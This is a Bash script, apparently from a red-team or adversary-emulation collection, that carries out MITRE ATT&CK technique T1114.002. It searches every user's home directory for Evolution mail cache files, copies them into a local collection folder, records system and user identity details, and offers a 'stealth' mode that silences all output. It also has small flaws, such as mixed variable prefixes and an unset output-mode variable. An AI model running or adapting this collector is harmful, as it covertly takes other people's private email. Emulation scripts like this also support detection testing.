
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1114_002B_DEBUG_MODE="${T1114_002B_DEBUG_MODE:-false}"
    export T1114_002B_TIMEOUT="${T1114_002B_TIMEOUT:-300}"
    export T1114_002B_FALLBACK_MODE="${T1114_002B_FALLBACK_MODE:-real}"
    export T1114_002B_OUTPUT_FORMAT="${T1114_002B_OUTPUT_FORMAT:-json}"
    export T1114_002B_POLICY_CHECK="${T1114_002B_POLICY_CHECK:-true}"
    export T1114_002B_MAX_FILES="${T1114_002B_MAX_FILES:-200}"
    export T1114_002B_MAX_FILE_SIZE="${T1114_002B_MAX_FILE_SIZE:-1048576}"
    export T1114_002B_SCAN_DEPTH="${T1114_002B_SCAN_DEPTH:-3}"
    export T1114_002B_EXCLUDE_CACHE="${T1114_002B_EXCLUDE_CACHE:-true}"
    export T1114_002B_CAPTURE_DURATION="${T1114_002B_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1114.002b - Email Collection: Evolution Cache Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract Evolution email cache files ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${TT1114_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
}

# Environment variables loading
Load-EnvironmentVariables() {
    export TT1114_002B_OUTPUT_BASE="${TT1114_002B_OUTPUT_BASE:-./mitre_results}"
    export TT1114_002B_TIMEOUT="${TT1114_002B_TIMEOUT:-300}"
    export TT1114_002B_OUTPUT_MODE="${TT1114_002B_OUTPUT_MODE:-simple}"
    export TT1114_002B_SILENT_MODE="${TT1114_002B_SILENT_MODE:-false}"
    export T1114_002B_MAX_FILES="${T1114_002B_MAX_FILES:-200}"
    
    export T1114_002B_EVOLUTION_CACHE_PATHS="${T1114_002B_EVOLUTION_CACHE_PATHS:-/home/*/.cache/evolution,/home/*/_evolution/cache}"
    export T1114_002B_CACHE_PATTERNS="${T1114_002B_CACHE_PATTERNS:-*.cache,*.tmp,*_db}"
    export T1114_002B_MAX_FILE_SIZE="${T1114_002B_MAX_FILE_SIZE:-52428800}"
    export T1114_002B_INCLUDE_TEMP="${T1114_002B_INCLUDE_TEMP:-true}"
    export T1114_002B_EXCLUDE_EMPTY="${T1114_002B_EXCLUDE_EMPTY:-true}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$TT1114_002B_OUTPUT_BASE" ]] && { [[ "${TT1114_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1114_002B_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$TT1114_002B_OUTPUT_BASE")" ]] && { [[ "${TT1114_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$TT1114_002B_OUTPUT_BASE/T1114_002b_evolution_cache_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{cache_data,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Evolution cache file collection
Collect-EvolutionCacheFile() {
    local file_path="$1" collection_dir="$2" user_name="$3"
    
    [[ ! -f "$file_path" || ! -r "$file_path" ]] && return 1
    
    # Skip empty files if excluded
    if [[ "$T1114_002B_EXCLUDE_EMPTY" == "true" ]]; then
        [[ ! -s "$file_path" ]] && return 1
    fi
    
    local file_size=$(stat -c%s "$file_path" 2>/dev/null || echo 0)
    [[ $file_size -gt $T1114_002B_MAX_FILE_SIZE ]] && return 1
    
    local filename=$(basename "$file_path")
    local safe_name="evolution_cache_${user_name}_${filename}_$(date +%s)"
    
    if cp "$file_path" "$collection_dir/cache_data/$safe_name" 2>/dev/null; then
        echo "$file_path:$file_size"
        [[ "$TT1114_002B_SILENT_MODE" != "true" && "${TT1114_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "  + Collected: $file_path ($file_size bytes)" >&2
        return 0
    fi
    return 1
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1114_002B_SILENT_MODE is true
    [[ "$TT1114_002B_SILENT_MODE" != "true" && "${TT1114_002B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "EVOLUTION CACHE COLLECTION "
    echo "Files: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1114.002b",
    "results": {
        "files_collected": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$TT1114_002B_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Extracting Evolution cache..."
    
    # ATOMIC ACTION: Orchestration of auxiliary functions
    IFS=',' read -ra cache_paths <<< "$T1114_002B_EVOLUTION_CACHE_PATHS"
    IFS=',' read -ra patterns <<< "$T1114_002B_CACHE_PATTERNS"
    
    for cache_path_pattern in "${cache_paths[@]}"; do
        cache_path_pattern=$(echo "$cache_path_pattern" | xargs)
        
        for cache_path in $cache_path_pattern; do
            [[ ! -d "$cache_path" ]] && continue
            
            local user_name=$(echo "$cache_path" | sed 's|.*/home/\([^/]*\)/.*|\1|')
            
            for pattern in "${patterns[@]}"; do
                pattern=$(echo "$pattern" | xargs)
                
                while IFS= read -r -d '' cache_file; do
                    if result=$(Collect-EvolutionCacheFile "$cache_file" "$collection_dir" "$user_name"); then
                        IFS=':' read -r file_path file_size <<< "$result"
                        collected_files+=("$file_path")
                        total_size=$((total_size + file_size))
                        ((file_count++))
                        [[ $file_count -ge ${T1114_002B_MAX_FILES:-200} ]] && break 2
                    fi
                done < <(find "$cache_path" -name "$pattern" -type f -print0 2>/dev/null)
            done
        done
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected files collected"
    exit 0
}

# Execute
Main "$@"